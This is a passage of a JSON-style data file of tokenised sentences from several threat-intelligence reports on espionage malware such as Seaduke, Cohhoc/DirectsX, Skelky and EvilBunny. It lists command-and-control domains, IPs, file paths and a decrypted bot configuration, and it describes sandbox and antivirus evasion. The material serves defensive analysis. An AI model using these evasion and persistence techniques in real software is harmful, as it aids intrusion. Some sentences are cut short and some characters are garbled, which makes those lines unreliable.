tactic proved successful .", "340": "There is nothing especially sophisticated in their exploits , or in the malware they used to infect victims .", "341": "They used dozens of compromised servers as Command and Control domains with a simple , but effective , PHP backend .", "342": "However there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks .", "343": "We believe they are likely its only operators as of June 2014 .", "344": "Thanks to the monitoring of several of the Command and Control domains used by the group , we were able to identify several victims .", "345": "This victims ' list reinforces the interests shown by the Crouching Yeti actor in strategic targets , but also shows the interest of the group in many other not - so - obvious institutions .", "346": "We believe they might be collateral victims , but it might also be fair to redefine the Crouching Yeti actor not only as a highly targeted one in a very specific area of interest , but a broad surveillance campaign with interests in different sectors .", "347": "We will continue monitoring this actor .", "348": "Low - profile information - stealing Trojan is used only against high- value targets .", "349": "Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the \u20ac \u0153Duke \u20ac \u200b family of malware .", "350": "Seaduke ( detected by Symantec as Trojan . Seaduke ) is a low - profile information- stealing Trojan which appears to be reserved for attacks against a small number of high - value targets .", "351": "Seaduke has been used in attacks against a number of major , government - level targets .", "352": "The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim \u20ac \u2122s computer .", "353": "Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks .", "354": "Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high - level government targets .", "355": "While the Duke group began to distribute Cozyduke in an increasingly aggressive manner , Seaduke installations were reserved only for select targets .", "356": "The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high - profile individuals and organizations in government , international policy and private research in the United States and Europe .", "357": "It has a range of malware tools at its disposal , known as the Dukes , including Cozyduke ( Trojan . Cozer ) , Miniduke ( Backdoor . Miniduke ) and Cosmicduke ( Backdoor . Tinybaron ) .", "358": "News of the Duke group first emerged in March and April of 2015 , when reports detailing attacks involving a sophisticated threat actor variously called Office Monkeys , EuroAPT , Cozy Bear , and Cozyduke were published .", "359": "Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010 .", "360": "The group began its current campaign as early as March 2014 , when Trojan . Cozer ( aka Cozyduke ) was identified on the network of a private research institute in Washington , D.C.", "361": "These tactics were atypical of a cyberespionage group .", "362": "It \u20ac \u2122s quite likely these themes were deliberately chosen to act as a smokescreen , hiding the true intent of the adversary .", "363": "The Duke group has mounted an extended campaign targeting high - profile networks over extended periods , something which is far beyond the reach of the majority of threat actors .", "364": "Its capabilities include .", "365": "Attack infrastructure leveraging hundreds of compromised websites Rapidly developed malware frameworks in concurrent use Sophisticated operators with fine - tuned computer network exploitation ( CNE ) skills Although Cozyduke activity was first identified in March 2014 , it wasn \u20ac \u2122t until July that the group managed to successfully compromise high - profile government networks .", "366": "Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers .", "367": "In parallel , the Duke group was also installing separate malware onto these networks , namely Backdoor . Miniduke and the more elusive Trojan . Seaduke .", "368": "It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms .", "369": "Miniduke has been the group \u20ac \u2122s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex - Soviet states .", "370": "\u20ac \u0153Nemesis Gemina \u20ac \u200b appears to be the internal name for the framework used by the group to identify the project , previously reported by Kaspersky .", "371": "The following debug string was present in the sample used in these attacks .", "372": "C:\\Projects\\nemesis - gemina\\nemesis\\bin\\carriers\\ezlzma_x86_exe.pdb This project name has been seen in Backdoor . Tinybaron ( aka Cosmicduke ) samples , which Symantec also attributes to the Duke group .", "373": "This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks .", "374": "The Seaduke payload These attacks were already well underway when another group began to deploy a previously unknown piece of malware .", "375": "In October 2014 , the Seaduke payload began to appear within target networks .", "376": "Although Seaduke was developed in Python , the overall framework bears a striking resemblance to Cozyduke in terms of operation .", "377": "It \u20ac \u2122s unclear why the attackers waited until October to deploy Seaduke .", "378": "Was it reserved for a more specific attack ? Was part of their cover blown , necessitating the use of an alternative framework ? The Seaduke framework was designed to be highly configurable .", "379": "Hundreds of reconfigurations were identified on compromised networks .", "380": "The communication protocol employed had many layers of encryption and obfuscation , using over 200 compromised web servers for command and control .", "381": "Seaduke required a significant investment of time and resources in the preparatory and operational phases of the attack .", "382": "Seaduke operation The attackers can operate Seaduke in a broadly similar fashion to Cozyduke .", "383": "The Seaduke control infrastructure is essentially distinct , opening up the possibility of sub - teams concurrently exploiting the target network .", "384": "Seaduke securely communicates with the C&C server over HTTP / HTTPS beneath layers of encoding ( Base64 ) and encryption ( RC4 , AES ) .", "385": "To an untrained eye , the communications look fairly benign , no doubt an effort to stay under the radar on compromised networks .", "386": "Seaduke has many inbuilt commands which are available to the attackers .", "387": "The self - delete function is interestingly called \u20ac \u0153seppuku \u20ac \u200b.", "388": "This is a form of Japanese ritual suicide .", "389": "The attackers have also developed a number of additional payloads .", "390": "Operators can push these payloads onto infected machines for very specific attacks .", "391": "What next ? The Duke group has brought its operational capability to the next level .", "392": "Its attacks have been so bold and aggressive , that a huge amount of attention has been drawn to it , yet it appears to be unperturbed .", "393": "Its success at compromising such high - profile targets has no doubt added a few feathers to its cap .", "394": "Even the developers reveled in this fact , naming one of Seaduke \u20ac \u2122s functions \u20ac \u0153forkmeiamfamous \u20ac \u200b.", "395": "While the group is currently keeping a lower profile , there \u20ac \u2122s no doubt it will reappear .", "396": "Some tools may have to be abandoned , some reworked and others built completely from scratch .", "397": "This attack group is in it for the long haul .", "398": "The experts of G DATA 's SecurityLabs discovered a cyber - espionage campaign that perfectly exemplifies the way how targeted attacks work .", "399": "The purpose of this campaign was to steal valuable documents from the targeted entity .", "400": "We entitle this operation \" TooHash \" .", "401": "The attackers do not choose their targets indiscriminately , which we derive from the fact that they sent specially crafted CV documents , probably to human resources management employees .", "402": "Naturally , the recipients are inclined to open such documents on a daily base .", "403": "The majority of discovered samples were submitted from Taiwan .", "404": "As part of the documents are in Simplified Chinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong , Macao and Taiwan , these malicious documents might have been used against targets in the whole Greater China area .", "405": "During the campaign , we identified two different pieces of malware .", "406": "The servers were mainly located in Hong Kong and the USA .", "407": "Furthermore , the administration panel 's language , used by the attackers to manage infected systems , was partly written in Chinese and partly in English .", "408": "The exploit used by the attackers is identified and blocked by G DATA 's Exploit Protection technology and G DATA 's security solutions detect the dropped binaries as Win32.Trojan . Cohhoc . A and Win32.Trojan . DirectsX.A respectively .", "409": "Nowadays , trade secrets describe one of the major values of almost every company .", "410": "Therefore , begrudged competitors may be tempted to steal valuable sensitive information for their purposes .", "411": "The leak of sensitive documents can be a disaster for a company and lead to large financial losses .", "412": "Furthermore , governmental entities use sensitive , private or classified documents .", "413": "Intelligence agencies may be interested to obtain such documents .", "414": "The analyzed samples used in the \" TooHash \" campaign were Microsoft Office documents , and were submitted to us from a Taiwanese customer .", "415": "An indication leading to the target area is one of the documents used by the attackers , which contained the string \" 102\u5e74\u5c3e\u7259\u3001 \" which means \" end of the year 102 \" .", "416": "The official calendar used in Taiwan starts in 1912 ( year 1 ) , so the year 102 is the year 2013 according to the Gregorian calendar ( 1911 + 102=2013 ) .", "417": "We conclude that the targets are entities located in the Greater China area and on the name of another document used by the attacker called \u674e\u8f89\u7b80\u5386.doc which translates to \" resume of Li Hui \" .", "418": "Another lead , suggesting that the attacks occurred in the Greater China area , is the fact that the majority of samples available on VirusTotal were originally submitted from Taiwan .", "419": "The DNS - name of the C&C server contained information about affected companies .", "420": "Here is a list of some targeted entities .", "421": "This campaign comprised a Microsoft Office document being sent to the victim .", "422": "A probable entry point for a manipulated CV would be an HR department .", "423": "If the document is opened with an outdated Microsoft Office version , malware is installed by exploiting vulnerability CVE-2012 - 0158 .", "424": "To appear credible , the attackers selected the targeted users and the type of the attached documents cleverly .", "425": "For example , a Microsoft Office Word document called resume of Li Hui.doc .", "426": "The document title as well as the content was written in Simplified Chinese .", "427": "The titles of the attacking documents involved are as follows .", "428": "To explain the exploit used , we have a look at the Word document , the ostensible CV .", "429": "The mentioned exploit causes Microsoft Word to crash , which might alert attacked users just right away .", "430": "In our case , the attackers crafted their malicious document in a special way to conceal the software crash : The malicious .doc causes a crash , but moments after the crash a legitimate Word session opens up and , to the user , everything appears to be normal .", "431": "Nevertheless , cautious users might suspect malicious actions behind such activities and notify security staff .", "432": "The CV that comes with the legitimate Word document ( Wo.doc ) is written in Chinese characters and style used in the Chinese mainland .", "433": "Nevertheless , this sample has also been submitted to us from Taiwan .", "434": "The resume visible to the user ( Wo.doc ) holds a tracking mechanism : Li Hui 's picture , visible in the document as the blank square on the right hand side , is not stored locally but stored on the Internet .", "435": "The following tag , inside the document , reveals this function .", "436": "We identified two types of malware used to administrate the infected machines : Cohhoc and DirectsX.", "437": "The first one is a \" classic \" Remote Administration Tool .", "438": "The second one is more advanced and of a different kind , the malware is a rootkit .", "439": "It is executed in kernel mode .", "440": "The RAT and the rootkit both share the same command and control infrastructure .", "441": "The malware is divided into three parts .", "442": "The second component is installed into a subfolder of the directory % APPDATA% ( for example in % APPDATA%\\Microsoft\\ ) .", "443": "Known file names for the files used during the campaign discussed : svchost.exe and conime.exe .", "444": "The second component works similarly .", "445": "In case you are interested in information regarding the unpacking of this malware , please feel free to contact us using toohash.securityblog@gdata.de During the TooHash campaign , we were able to identify two variants of \" Cohhoc \" .", "446": "Those two versions can be distinguished by looking at the creation of the respective mutex after the malware is started .", "447": "The main difference between the two malware variants is the handling of the payload ( component three ) .", "448": "In the earlier version , the payload is located within a resource inside component two .", "449": "In the later version , the payload is an additional file .", "450": "This additional file is stored in the same directory as the second component and its name is brndlog .", "451": "As small as this difference seems to be for a normal computer user , from a malware analyst 's point of view , it is a huge difference .", "452": "If , in the first case , the sample was found within a sample database , the analyst would be able to extract the payload and to analyze it right away .", "453": "However , in the second case , the analyst can not extract and analyze the payload at all .", "454": "In this context , the second component alone is rather useless ; one needs to find the binary which installs the payload .", "455": "Furthermore , it is rather complex to create signature detection for an encrypted file , such as the payload discussed .", "456": "This shortcut is labeled as Internet Explorer .lnk .", "457": "The blank space just before the file name extension was inserted to trick the user .", "458": "The text looks exactly like the original without the additional space .", "459": "Furthermore , it is not only the file 's name which sidetracks , but also the icon used for this link comes in the disguise of Microsoft 's Internet Explorer .", "460": "The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The \" Cohhoc \" malware is a Remote Administration Tool and is able to .", "461": "Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .", "462": "If the file % APPDATA%\\Adobe\\ActiveX.dat exists on the system , the malware uses the server listed in this file instead of the hardcoded servers .", "463": "The content in the file must use the obfuscation system described in the next chapter .", "464": "This approach , using an extra file with server information , proves to be particularly useful for the attackers , as they do not have to transmit new payload to the infected system .", "465": "Furthermore , it keeps analysts in the dark about additional C&Cs in case they only see the .dat file .", "466": "This file alone is rather useless .", "467": "We have seen the same technique when looking at the differences between the two malware variants before .", "468": "The obfuscation is used .", "469": "This algorithm can easily be adapted in C language .", "470": "Fellow researchers are welcome to receive the code after contacting samplerequest@gdata.de .", "471": "To be readable and easily usable , the base64 encoded data ( in binary format ) is converted into ASCII .", "472": "Here is an example to decode a command and control .", "473": "The malware uses HTTP to communicate to the command and control servers .", "474": "Here is an example of a request performed by an infected system .", "475": "The relevant data is placed after the GET request .", "476": "Here is the content of the request , decoded by using the code mentioned above .", "477": "Here are the different parts of the data transmitted .", "478": "The dropper is used to install two files and the persistence mechanism .", "479": "The two files are DirectsX.sys ( the malicious driver ) and directsx ( without any extension ) .", "480": "The second file is the encoded payload used by the driver .", "481": "The installed file and the registry modifications are stored in a resource within the dropper .", "482": "Here is a screenshot of the registry key created .", "483": "The dropper and the driver are both signed by a legitimate certificate .", "484": "The certificate is owned by \" Jiangxi you ma chuang da software technology Co. , LTD \" , has been reported stolen and is known to have been used in APT attacks .", "485": "Here is a screenshot of the certificate .", "486": "The main purpose of the driver is to decode the content of the directsx file and to inject the payload into a userland process .", "487": "The algorithm used to encode the data in the file is a XOR followed by a SUB .", "488": "The values of the XOR and the SUB can be different .", "489": "The decoding file contains the configuration ( command and control ) and a library ( .dll ) to inject in userland .", "490": "Here is an example of configuration .", "491": "To perform the injection , the driver uses the API KeStackAttachProcess ( ) .", "492": "This function allows it to attach the current thread to an address space of a userland process .", "493": "The name of the rootkit is linked to its device name : \\\\device\\DirectsX and its symbolic name : \\\\DosDevices\\DirectsX.", "494": "The injected dll is signed with the same certificate , too .", "495": "It is the remote administration tool itself , injected by the rootkit .", "496": "The tool allows the attackers .", "497": "This library is a variant of a remote administration tool also known as Savit .", "498": "We identified more than 75 different servers .", "499": "The complete list of domains is available in the appendix .", "500": "The IP resolved by the domains changed frequently .", "501": "At the time of writing this report , all known C&C servers were mainly located in Hong Kong , with three different host companies .", "502": "A fourth host company used was located in the US .", "503": "The IP ranges used by then .", "504": "The choice of domain names was made to trick the users or the security team during their analysis of the web logs collected .", "505": "Have a look at two examples used during the TooHash campaign .", "506": "For each domain , the attackers add a subdomain , the subdomain is generally assumed to be the name ( or the acronym ) of the targeted entities .", "507": "Here is an example : nspo.intarnetservices.com .", "508": "This could , in the context of the Greater China area , stand for the National Space Organization located in Taiwan .", "509": "The attackers control infected machines with the help of web servers installed on the C&Cs , they do not need to have remote access .", "510": "Here is the authentication page of the administration panel and aswe can see , the panel is partly written in Simplified Chinese .", "511": "We did not clearly identify the people behind this campaign .", "512": "The use of the stolen certificate could point the Shiqiang group , but nothing can be proven .", "513": "Anyway , in our case , the attackers clearly targeted private business and governmental organizations as well .", "514": "Either the group decided to target governmental entities as well or the stolen certificate is used by several groups .", "515": "In any case , the attackers are well organized and use a huge and complex infrastructure to manage the infected systems .", "516": "Furthermore , they use two different malware types in order to always have access to the targeted organizations even if one malware is detected .", "517": "The second malware becomes a spare wheel .", "518": "We assume that the people behind the group are professionals .", "519": "This campaign showed us once more , that people do not hesitate to use sophisticated and deceptive methods to steal data from companies or governmental organizations .", "520": "The files submitted to us seem to have targeted companies in the Greater China area but this technology can easily be used against organizations in other countries and regions across the globe .", "521": "Due to the increasing value of nowadays ' trade secrets and political secrets , we believe that the use of this kind of sponsored campaign is very likely to increase in the future .", "522": "Companies and other entities as well need to increase their security measures and to educate the users about the risks they might encounter while working with a computer \u2013 ranging from social engineering to malware attacks , etc .", "523": "The exploits used during this campaign are detected by G DATA 's exploit protection system and the files involved are detected by our antivirus engines .", "524": "In case you would like to receive further technical information or would like to contribute any information to this case , please feel free to contact us by using the following email address : toohash.securityblog@gdata.de Documents ( and the original name ) .", "525": "Cohhoc samples .", "526": "DirectsX samples .", "527": "% USERPROFILE%\\Start Menu\\Programs\\Startup\\Internet Explorer .lnk % APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Internet Explorer .lnk % APPDATA%\\Adobe\\ActiveX.dat % APPDATA%\\Adobe\\ActiveX.bat % APPDATA%\\Microsoft\\conime.exe % APPDATA%\\Microsoft\\conime.exe.en % TEMP%\\svchost.exe % TEMP%\\war.exe % TEMP%\\Wo.doc % SystemRoot%\\System\\directsx.sys % CommonProgramFiles%\\System\\directsx \\\\Device\\DirectsX \\\\DosDevices\\DirectsX * .cnnic - micro.com * .proxydomain.org * .dyndns - office.com * .kmdns.net * .privnsb.com * .adobeservice.net * .webmailerservices.com * .intarnetservice.com In case you wish to have information about the IPs involved , please get in touch with us via toohash.securityblog@gdata.de", "528": "New evidence suggests that the skeleton key malware , known as Trojan . Skelky , could be linked to the Backdoor . Winnti malware family .", "529": "\u20ac The Skelky ( from skeleton key ) tool is deployed when an attacker gains access to a victim \u20ac \u2122s network ; the attackers may also utilize other tools and elements in their attack .", "530": "Symantec has analyzed Trojan . Skelky and found that it may be linked to the Backdoor . Winnti malware family .", "531": "The attackers behind the Trojan . Skelky campaign appear to have been using the malware in conjunction with this back door threat .", "532": "It \u20ac \u2122s unclear if the malware family Backdoor . Winnti is used by one attack group or many groups .", "533": "During our research , we also found that Trojan . Skelky has been active over the past two years .", "534": "Within this timeframe , we have seen new variants and a consistent hashed password value .", "535": "Symantec telemetry identified the skeleton key malware on compromised computers in five organizations with offices in the United States and Vietnam .", "536": "The exact nature and names of the affected organizations is unknown to Symantec .", "537": "The first activity was seen in January 2013 and until November 2013 , there was no further activity involving the skeleton key malware .", "538": "In November 2013 , the attackers increased their usage of the tool and have been active ever since .", "539": "Four more variants of Trojan . Skelky were discovered as well as additional file names used by the attackers .", "540": "The complete set of observed file names and hashes are listed as follows From the first observed use of the tool in January 2013 to the present , the attackers have consistently used the same password .", "541": "This is the case with three different variants of the tool .", "542": "The regular use of the same password across multiple variants means it \u20ac \u2122s likely that only one group of attackers has been using the tool until at least January 2015 .", "543": "By identifying any other malware active on compromised computers at the same time as Trojan . Skelky , it is possible to learn more about the attackers .", "544": "There were almost no signs of other malware active at the same time as Skelky in most of the organizations investigated .", "545": "However , two compromised computers had other malware present , active , and in the same directory , at the same time as Trojan . Skelky .", "546": "Two files were discovered on one of the victim \u20ac \u2122s computers .", "547": "One file is a variant of Backdoor . Winnti ( jqs.exe ) and the other is a dropper for Backdoor . Winnti ( tmp8296.tmp ) , which is responsible for creating the Backdoor . Winnti sample .", "548": "Details on the file names and hashes are as follows .", "549": "Backdoor . Winnti has been used in the past in a number of different campaigns , most notably against Asian games companies .", "550": "Given the disparate nature of some victims , it \u20ac \u2122s unclear if the malware is used by one set of attackers , or many .", "551": "Symantec is continuing its investigation into this malware familyBackdoor . Winnti and the specific actors behind the combined use of Backdoor . Winnti and Trojan . Skelky .", "552": "Symantec and Norton products have the following protections against the skeleton key malware .", "553": "AV Trojan . Skelky Customers with Behaviour - Based Protection enabled are protected with the signature SONAR.Module!gen3 .", "554": "Today , our friends at FireEye released a report on an Iran - based adversary they are calling Saffron Rose .", "555": "CrowdStrike Intelligence has also been tracking and reporting internally on this threat group since mid- January 2014 under the name FLYING KITTEN , and since that time has seen targeting of multiple U.S.- based defense contractors as well as political dissidents .", "556": "FireEye 's report notes that this adversary 's targeted intrusion activity consists of credential theft and malware delivery individually .", "557": "The FLYING KITTEN campaigns investigated by CrowdStrike Intelligence showed that the actor actually combines the two .", "558": "In addition to the aerospace / defense and dissident targeting , it also appears that FLYING KITTEN is also engaged in broader targeting via the website parmanpower[.]com .", "559": "This website is registered via the same registrant email ( info[@]usa.gov.us ) and other Whois information as some of the other domains related to the activity discussed above .", "560": "It purports to be the website of a business engaged in recruiting , training , and development in Erbil , Iraq .", "561": "No malicious activity has been linked to this domain , however , the fact that it was registered under the same registrant email at the same time as other FLYING KITTEN domains linked to malicious activity , it is likely that the adversary is using this site for malicious purposes as well .", "562": "The website does not appear to deliver any malware , so its most likely purpose is to act as a credential - collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014[.]org ) the adversary used earlier this year .", "563": "This spoofed recruiting company website could be used to target entities across a wide range of sectors .", "564": "Attribution in this case is interesting , as the adversary appears to have made a mistake when registering its malicious domains .", "565": "The registrant email that currently appears in the Whois records of some of the FLYING KITTEN domains is info[@]usa.gov.us , however historical records show that the domains were originally registered under the email address keyvan.ajaxtm[@]gmail.com .", "566": "As FireEye 's report notes , the keyvan.ajaxtm@gmail.com email address ties back to an Iran - based entity called Ajax Security Team .", "567": "Earlier this year , Ajax Security had an easily identifiable presence on the Internet with its own website and related Facebook pages .", "568": "This Internet presence has decreased significantly since early 2014 , likely due to a desire to keep a lower profile now that the group is engaged in targeted intrusion activity .", "569": "The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool .", "570": "You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .", "571": "If you have any questions about these signatures or want to hear more about Flying Kitten and their tradecraft , please contact : intelligence@crowdstrike.com and inquire about Falcon Intelligence , our Cyber Threat Intelligence subscription .", "572": "Share this -", "573": "Suspect # 4 is the fourth out of a row of malware samples , which are believed to stem from the same malicious actor .", "574": "Insights on the campaign were first presented at Hack.lu Conference 2014 in Luxembourg .", "575": "The name ' EvilBunny ' is derived from a link to debug information embedded in the dropper binary of suspect # 4 .", "576": "The path to the associated .pdb - file contains the name of the project and sub project , namely ' bunny 2.3.2 ' and ' Transporter2 ' .", "577": "Both , dropper and payload were compiled on 25th of October 2011 , while CVE-2011 - 4369 was released only on 16 th of December .", "578": "It is unclear as of when the attacks started ; although , clearly , either the attackers adopted the vulnerability within 4 days or the attacks were performed using an AdobeReader 0-day .", "579": "The functionality of the dropper can be summarized in the following steps .", "580": "It tests the module file name to see if it is less than 5 characters long or if it contains either of the four strings ' klavme ' , ' myapp ' , ' TESTAPP ' or ' afyjevmv.exe ' .", "581": "Also , it verifies if less than 15 processes are running in the environment , using the API call EnumProcesses .", "582": "In case any of the conditions is met execution will abort .", "583": "Up to the time of writing it remains unclear which environment the mentioned strings aim to identify , if any .", "584": "More specifically , the malware is interested in the data fields ' productUptoDate ' , ' VersionNumber ' , ' DisplayName ' and ' productState ' .", "585": "The information about AntiVirus provided by WMI differs between Windows versions , so the requests address different namespaces , ' ROOT\\SecurityCenter ' for WindowsXP and ' ROOT\\SecurityCenter2 ' for Windows Vista and newer versions .", "586": "Names of AntiVirus products are represented as hard coded SHA-256 hashes , namely the following .", "587": "d4634c9d57c06983e1d2d6dc92e74e6103c132a97f8dc3e7158fa89420647ec3 4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f bfe74ca464620a62f11b8c47a3778bb132d84fecd90ce7c75817970f2eeeca51 Antivirus 443b6fb65fa57d57ee3113e48e9b4ed1db2921d5352e27fa85064cd60553c3ff BitDefender e1625a7f2f6947ea8e9328e66562a8b255bc4d5721d427f943002bb2b9fc5645 588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56 Kaspersky Only three of the seven hashes were identified .", "588": "If any of the indicated products is installed and active on the machine execution will abort .", "589": "The dropper comes with its payload attached in the resource section .", "590": "The resource RCData contains the entire netmgr.exe binary ; alleged suspect # 4 .", "591": "The binary is dropped as netmgr.exe , either located in % APPDATA%\\Perf Manager\\ or % WINDIR%\\msapps\\.", "592": "The final directory location depends whether the dropper is running with administrative privileges or not .", "593": "Interestingly , the dropper also changes the creation time stamp of the newly created binary to time stamp of the system executable explorer.exe .", "594": "This entry is named ' isakmpAutoNegociate ' and points to the dropper binary .", "595": "The naming of the key for cleanup of the dropper is chosen to confuse analysts , although the name is clearly misspelled .", "596": "Another interesting side fact is that the dropper does not start the dropped malware , neither does it contain code which could even do so .", "597": "This implies , the final infection stage does not start unless the infected machine is rebooted .", "598": "Also , the dropper binary will not be deleted in the meanwhile .", "599": "Suspect # 4 was the fourth discovered sample in a row of malware related to the EvilBunny attacks ; even before its dropper .", "600": "Yet , it is by far the most interesting one .", "601": "It is a multi- threaded bot with an integrated scripting engine .", "602": "It incorporates a Lua engine and downloads and executes Lua scripts to reach a certain level of polymorphism .", "603": "In total Suspect # 4 exhibits three different methods for receiving C&C input and executing commands ; directly via HTTP , through a downloaded database file or as a scheduled task .", "604": "The initial purpose of the malware seems to be sharing execution load among infected host machines .", "605": "However , due to the lack of the original Lua scripts and the extensive functionality of the embedded Lua engine the original intentions of the attackers remain unknown .", "606": "Suspect # 4 is written in C++ , and just like its dropper , it is not protected by any runtime packer or crypter .", "607": "It is , however , compiled with a performance optimization option which causes a lot of code in - lining and duplicate code in the binary .", "608": "Duplication also applies to string constants , as every string is present once per function , if the given function uses it .", "609": "This might accelerate execution speed of the bot at runtime , but implicitly or even on purpose hinders static analysis of the binary code .", "610": "Cross referencing of strings or helper functions is ineffective due to the duplications .", "611": "One function exists , which resembles the sandbox check of its dropper with minor extensions .", "612": "This sandbox detection consists of three parts .", "613": "For no obvious reason though , the obfuscation algorithm is only applied to a small subset of APIs used in the code .", "614": "The algorithm uses the fixed value AB34CD77h and a combination of XOR and ROL instructions to calculate hashes from the export names of kernel32.dll , advapi32.dll and psapi.dll .", "615": "It is important to note that this obfuscation trick and the according hash function remain consistent through out all related samples .", "616": "For AntiVirus detection it utilizes WMI and issues ' SELECT * FROM AntiVirusProduct ' .", "617": "Identification of installed products is achieved by comparing the hashed product name to a set of SHA-256 hashes ; although , a different and much bigger set than used by its dropper .", "618": "With the help of hash tables from perturb.org and md5decoder.org it is possible to revert some of the hashes to their original text form .", "619": "The malware retrieves the attributes ' productState ' , ' DisplayName ' and on WindowsXP also ' productUptoDate ' .", "620": "It is noteworthy though , that for netmgr.exe the existence of any of the indicated AntiVirus products does not pose a reason to end execution .", "621": "In fact , these hashes are the only measure for obfuscating strings in the binary .", "622": "Firewall detection works equally via querying WMI through \" SELECT * FROM FirewallProduct \" , while this time the malware searches for the attributes ' enabled ' , ' VersionNumber ' and ' DisplayName ' .", "623": "AntiVirus and firewall information is stored in objects in a linked list at runtime .", "624": "Either way , the results of this check do not influence the flow of execution .", "625": "At start - up netmgr.exe decrypts a configuration file stored in its resource section , revealing three URLs , among timeout settings and encryption keys .", "626": "All three of these URLs served as C&C contacts when the attack was still ongoing , sending commands or Lua scripts to the infected host .", "627": "Interesting is that two of the domains are actual fake domains resembling legitimate websites while one is a legitimate domain nowadays .", "628": "Le - progres.net could be easily confused with leprogres.fr , the official website of the Lyon news paper Le Progres .", "629": "Usthb - dz.org is remarkably similar to usthb.dz , the website of the University of Sciences and Technology Houari Boumediene in Algiers , Algeria .", "630": "The third domain though , ghatreh.com , is the legitimate address of an Iranian news website .", "631": "According to domaintools.com , this domain has been created in November 2004 while the last change happened in September 2012 .", "632": "Also , domaintools.com reveals 14 unique IP addresses and 4 different registrars .", "633": "It is assumed that the domain has been dropped by the attackers in 2012 and picked up by legitimate operators .", "634": "The IP addresses of the domains in 2011 , at a time when dropper , payload and C&Cs were still active , were 69.90.160.65 , 70.38.107.13 and 70.38.12.10 .", "635": "All three IPs are located in Canada , two relate to Montr al , one to Oakville .", "636": "The complete passive DNS history can be reviewed in appendix A.", "637": "The binary also contains the URL ' http://1.9.32.11/bunny/test.php?rec=nvista ' , but the purpose of it remains unclear .", "638": "This IP address is never contacted by the malware .", "639": "Find the entire decrypted configuration below .", "640": "< COMMAND_KEY > wqNbo8DSbWZiq1QZ4NnmTcibYRJIFxmlSBQh1zdF8IlDKin2zkNOVtKvlx92Q0QOQnA Nt1NCbDItwVQWY0HBQ2GKYPecpfuQ6JPZG0dQRarhCy7nTT3ukET9YzQEPN81</COMMAND_KEY > < STORAGE_KEY > lbuLmdAouhUkSsMXckMUevjNf87S4ATWYwLYGLM44O1ortQEE2vr34QGzjPhrWeosFB YQpT6dRwDuPPuP13zzqZhW3PeCQA7OUEghovMwEGYx1annboIwRxKbhUOIMsf</STORAGE_KEY > < RESPONSE_KEY>8kMQOWondQc2ZgYgirg9NHg0QUiIIBdPe0YtIVfvxa9rvJ9wtFGx8ko4oFY34PrSkW 9cKzEFZYDnM54qeWcvSMIi9sBAkcD5ggFDmQOGdO42ef344I7s9wAKoAXKeq1s</RESPONSE_KEY > < COMMAND_FILE_PATH_AND_PREFIX>%SELFDIR%\\net.cap</COMMAND_FILE_PATH_AND_PREFIX > < URL1>http://le - progres.net / images / php / test.php?rec=11206 - 01</URL1 > < URL2>http://ghatreh.com / skins / php / test.php?rec=11206 - 01</URL2 > < URL3>http://www.usthb - dz.org / includes / php / test.php?rec=11206 - 01</URL3 > < INJECTED>0</INJECTED > < STARTDELAY>0</STARTDELAY > < DIEDELAY>120</DIEDELAY > The configuration provides three keys for encryption and decryption of data .", "641": "The command_key is used to decrypt commands received from the C&C server , the storage_key is used to encrypt and decrypt data being stored to files on disk and the response_key will encrypt callbacks to the C&C server .", "642": "All data exchanged with any of the C&C servers as well as data stored to a file on disk is encrypted with the according key .", "643": "Diedelay and startdelay are timeout settings , the exact use of the parameter injected is unclear up to the time of writing .", "644": "Command_file_path_and_prefix defines the name of the file which will holds C&C commands and Lua scripts at runtime .", "645": "The malware performs C&C command parsing and Lua script execution with dedicated threads , of which every thread creates its own net.cap file , extending the name by a fixed digit namely 0 , 1 , 3 or 4 .", "646": "At runtime the malware adds additional configuration parameters , which are not assigned an obvious name like those retrieved from the resource section .", "647": "The synonyms for all encrypted configuration values as they are stored in Windows registry are .", "648": "The attributes are encrypted before being written to registry , and will be decrypted on the fly every time the malware requests a specific parameter .", "649": "Suspect # 4 comes with a solid multi - threading model , which seeks to assure fail - safe and high - performance execution .", "650": "The malware runs a main thread , which manages four worker threads and performs C&C command parsing and Lua script execution .", "651": "The threads are coordinated via named events , global flag variables , in some cases also mutexes or semaphores are used .", "652": "The main action of the malware is carried out in the main thread , which parses commands and executes Lua scripts , provided by the worker threads via command files .", "653": "The threading model is summarized in the following graphic .", "654": "Therefor the thread enumerates all threads from the current process and calculates their execution time .", "655": "The user- and kernel land execution time is measured for every thread using the kernel32 ! GetThreadTimes API ; then aggregated , so the final value holds the overall CPU usage time of the malware process .", "656": "The thread keeps track of the time passing between executions .", "657": "If the malware 's active execution time in percentage of this delta exceeds a configured threshold , the malware will suspend all threads of its process for at least 5s .", "658": "The threshold is retrieved from configuration in Windows registry , and can be controlled by the botmaster via the C&C command setcpulimit ( see section 2.5 ) .", "659": "This clearly is an attempt to keeping a low profile on the infected machine .", "660": "By maintaining its own execution load the bot 's compromised svchost.exe process will not catch attention on the process list .", "661": "The backfile launching thread got its name from the named event ' backfilelaunching ' which is set to indicate that the dedicated thread has started .", "662": "Also in a 1s - frequency the malware runs the backfile thread to push dump files to one of its remote servers .", "663": "The files are named Perflib_Perfdat_dmpbX.dat , where X is an index number starting with 0 .", "664": "The data 